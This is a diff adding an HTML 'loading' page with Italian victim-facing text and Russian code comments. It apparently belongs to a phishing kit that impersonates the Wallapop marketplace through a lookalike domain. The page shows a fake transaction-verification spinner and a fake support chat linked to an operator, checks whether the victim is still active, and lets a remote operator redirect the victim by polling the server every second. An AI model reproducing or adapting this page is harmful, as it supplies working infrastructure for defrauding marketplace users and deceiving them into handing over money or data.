@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Page</title>
+
+    <style>
+        /* Сброс стандартных стилей */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        /* Центрирование контента */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f2f2f2;
+            text-align: center; /* Центровка текста */
+            color: #333;
+        }
+
+        /* Контейнер загрузки */
+        .loading-container {
+            max-width: 400px;
+        }
+        
+        /* Анимация спиннера */
+        .spinner {
+            border: 6px solid #ccc;
+            border-top-color: #333;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px; /* Центровка спиннера и отступ */
+        }
+        
+        /* Текст под спиннером */
+        .loading-container p {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        /* Анимация вращения */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+
+
+
+
+
+        /* чат */
+/* Общие стили */
+#chat-button {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background-color: #000;
+        color: #fff;
+        border: none;
+        border-radius: 50px;
+        width: 60px;
+        height: 60px;
+        font-size: 24px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        z-index: 1001;
+    }
+    
+    #chat-container {
+        position: fixed;
+        bottom: 80px;
+        right: 20px;
+        width: 280px;
+        max-height: 500px;
+        min-height: 400px;
+        background-color: #fff;
+        border-radius: 10px;
+        box-shadow: 0px 8px 16px rgba(0, 0, 0, 0.2);
+        display: none; /* Чат скрыт по умолчанию */
+        flex-direction: column;
+        overflow: hidden;
+        z-index: 1000;
+    }
+    
+    #chat-container.active {
+        display: flex; /* Показать чат при активации */
+    }
+    
+    #chat-header {
+        display: flex;
+        align-items: center;
+        background-color: #000;
+        color: #fff;
+        padding: 10px;
+        border-top-left-radius: 10px;
+        border-top-right-radius: 10px;
+    }
+    
+    .chat-avatar img {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        margin-right: 10px;
+    }
+    
+    .chat-info h3 {
+        margin: 0;
+        font-size: 16px;
+    }
+    
+    .chat-info p {
+        margin: 0;
+        font-size: 12px;
+        opacity: 0.7;
+    }
+    
+    #close-chat {
+        background: none;
+        border: none;
+        color: #fff;
+        font-size: 18px;
+        margin-left: auto;
+        cursor: pointer;
+    }
+    
+    #chat-messages {
+        flex: 1;
+        padding: 10px;
+        background-color: #f9f9f9;
+        overflow-y: auto;
+    }
+    
+    .chat-message {
+        margin: 5px 0;
+        display: flex;
+        align-items: flex-start;
+    }
+    
+    .chat-message.user {
+        justify-content: flex-end;
+    }
+    
+    .chat-bubble {
+        max-width: 70%;
+        padding: 10px;
+        border-radius: 10px;
+        font-size: 14px;
+        line-height: 1.4;
+    }
+    
+    .chat-message.user .chat-bubble {
+        background-color: #000;
+        color: #fff;
+        border-bottom-right-radius: 0;
+    }
+    
+    .chat-message.bot .chat-bubble {
+        background-color: #e0e0e0;
+        color: #000;
+        border-bottom-left-radius: 0;
+    }
+    
+    #chat-input {
+        display: flex;
+        padding: 10px;
+        background-color: #fff;
+        border-top: 1px solid #ddd;
+    }
+    
+    #message-input {
+        flex: 1;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 20px;
+        outline: none;
+        font-size: 14px;
+    }
+    
+    #send-button {
+        background-color: #000;
+        color: #fff;
+        border: none;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        margin-left: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+    }
+
+
+
+
+
+
+
+
+    </style>
+</head>
+<body>
+
+
+
+    <!-- ЧАТ НАЧ -->
+ <button id="chat-button">💬</button>
+ <div id="chat-container">
+     <div id="chat-header">
+         <div class="chat-avatar">
+             <img src="https://wallapopp.bapebk.shop/6y5vscqf/kg51x/343fdldg/gen/operator-img.png" alt="Support">
+         </div>
+         <div class="chat-info">
+             <h3>Supporto</h3>
+             <p>Online</p>
+         </div>
+         <button id="close-chat">✖</button>
+     </div>
+     <div id="chat-messages"></div>
+     <div id="chat-input">
+         <input type="text" id="message-input" placeholder="Digitare un messaggio...">
+         <button id="send-button">➤</button>
+     </div>
+ </div>
+     
+ <script>
+     const chatButton = document.getElementById('chat-button');
+     const chatContainer = document.getElementById('chat-container');
+     const closeChat = document.getElementById('close-chat');
+     const sendButton = document.getElementById('send-button');
+     const messageInput = document.getElementById('message-input');
+     const chatMessages = document.getElementById('chat-messages');
+     
+     // Открытие/закрытие чата
+     chatButton.addEventListener('click', () => {
+         chatContainer.classList.toggle('active');
+     });
+     
+     closeChat.addEventListener('click', () => {
+         chatContainer.classList.remove('active');
+     });
+     
+
+
+     // Функция для извлечения токена из URL
+     function getTokenFromURL() {
+         const url = window.location.pathname; // Получаем путь из URL
+         const match = url.match(/\/loading\/([^/]+)/); // Ищем токен после /get/
+         return match ? match[1] : null; // Возвращаем токен или null, если токен не найден
+     }
+
+
+
+
+     // Функция для запроса сообщений от администратора
+     async function fetchAdminMessages(token) {
+         try {
+             const response = await fetch(`/get_admin_message_support/${token}/`, {
+                 method: 'GET',
+                 headers: {
+                     'Content-Type': 'application/json'
+                 }
+             });
+
+             if (response.ok) {
+                 const data = await response.json();
+                 const status = data.status
+                 if (status=="success") {
+                     const adminMessage = data.message || null;
+                     if (adminMessage) {
+                         addMessage(adminMessage, 'bot'); // Добавляем сообщение от администратора
+                     }
+                 }
+             } else {
+                 console.error('Ошибка при запросе сообщений администратора:', response.status);
+             }
+         } catch (error) {
+             console.error('Ошибка при подключении:', error);
+         }
+     }
+     
+     // Функция для отправки сообщений
+     async function sendMessage() {
+         const userMessage = messageInput.value.trim();
+         const token = getTokenFromURL(); // Получаем токен из URL
+
+         if (userMessage && token) {
+             addMessage(userMessage, 'user'); // Отображаем сообщение от пользователя
+
+             // Формируем тело запроса
+             const payload = {
+                 text: userMessage,
+                 token: token
+             };
+
+             try {
+                 // Отправляем запрос на сервер
+                 const response = await fetch(`/send_message_support/${token}/`, {
+                     method: 'POST',
+                     headers: {
+                         'Content-Type': 'application/json'
+                     },
+                     body: JSON.stringify(payload)
+                 });
+
+                 if (response.ok) {
+                     messagePollingInterval = setInterval(() => {
+                         fetchAdminMessages(token);
+                     }, 2000);
+
+
+
+                 } else {
+                     addMessage('Ошибка сервера, попробуйте позже.', 'bot');
+                 }
+             } catch (error) {
+                 console.error('Ошибка:', error);
+                 addMessage('Ошибка подключения, попробуйте позже.', 'bot');
+             }
+
+             messageInput.value = ''; // Очищаем поле ввода
+         } else if (!token) {
+             alert('Токен не найден в URL!');
+         }
+}
+
+     // Функция для добавления сообщения
+     function addMessage(text, sender) {
+         const messageElement = document.createElement('div');
+         messageElement.classList.add('chat-message', sender);
+         const bubble = document.createElement('div');
+         bubble.classList.add('chat-bubble');
+         bubble.textContent = text;
+         messageElement.appendChild(bubble);
+         chatMessages.appendChild(messageElement);
+         chatMessages.scrollTop = chatMessages.scrollHeight;
+     }
+
+     // Привязка событий
+     sendButton.addEventListener('click', sendMessage); // Оставляем одну привязку
+     messageInput.addEventListener('keypress', (event) => {
+         if (event.key === 'Enter') {
+             sendMessage();
+         }
+     });
+
+</script>
+ 
+
+ <!-- ЧАТ КОН -->
+
+
+
+
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <p>Verifica delle transazioni...</p>
+        <p>Questo può richiedere diversi minuti. Si prega di non aggiornare o uscire dalla pagina.</p>
+    </div>
+
+
+
+
+    <script>
+        // Функция для получения данных с /data каждую секунду
+        setInterval(function() {
+            const currentUrl = window.location.href;
+        
+            // Извлечение части URL после "/loading/"
+            const extractedPart = currentUrl.split("/loading/")[1];
+    
+            // Выполняем запрос к серверу
+            fetch(`/data_view/${extractedPart}`)
+                .then(response => response.json())
+                .then(data => {
+    
+                    // Проверка, чтобы в 'data.page' не было строки 'loading'
+                    if (data.page && !data.page.includes('loading')) {
+                        window.location.href = data.page;  // Перенаправление на новый URL
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        }, 1000); // Запрос будет выполняться каждую секунду
+    </script>
+    
+
+
+
+
+
+
+
+
+
+
+<script>
+    const currentUrl = window.location.href;
+    const token = currentUrl.split("/loading/")[1];
+
+    // Функция для уведомления сервера
+    async function notifyServer() {
+    try {
+        const response = await fetch(`/check_activity/${token}`, {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json'
+        }
+        });
+        if (response.ok) {
+        console.log("Пользователь активен");
+        } else {
+        console.log("Ошибка сервера при проверке активности");
+        }
+    } catch (error) {
+        console.error("Ошибка при отправке запроса:", error);
+    }
+    }
+
+    // Устанавливаем интервал уведомлений
+    setInterval(notifyServer, 5000); // Отправляем запрос каждые 5 секунд
+</script>
+</body>
+</html>
